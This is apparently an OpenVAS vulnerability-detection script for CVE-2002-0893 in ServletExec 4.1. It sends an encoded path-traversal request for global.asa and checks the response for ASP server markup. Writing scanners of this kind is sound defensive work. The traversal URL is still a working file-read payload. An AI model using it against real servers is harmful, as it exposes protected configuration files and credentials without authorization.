if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10959" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4795 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2002-0893" );
	script_name( "ServletExec 4.1 ISAPI File Reading" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 Matt Moore" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "ftp://ftp.newatlanta.com/public/4_1/patches/" );
	script_xref( name: "URL", value: "http://www.westpoint.ltd.uk/advisories/wp-02-0006.txt" );
	script_tag( name: "solution", value: "Download Patch #9 from the linked vendor FTP." );
	script_tag( name: "summary", value: "By invoking the JSPServlet directly it is possible to read the contents of
  files within the webroot that would not normally be accessible (global.asa, for example.)" );
	script_tag( name: "insight", value: "When attempting to retrieve ASP pages it is common to see many
  errors due to their similarity to JSP pages in syntax, and hence only fragments of these pages
  are returned. Text files can generally be read without problem." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
url = "/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!res){
	exit( 0 );
}
if(ContainsString( res, "OBJECT RUNAT=Server" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

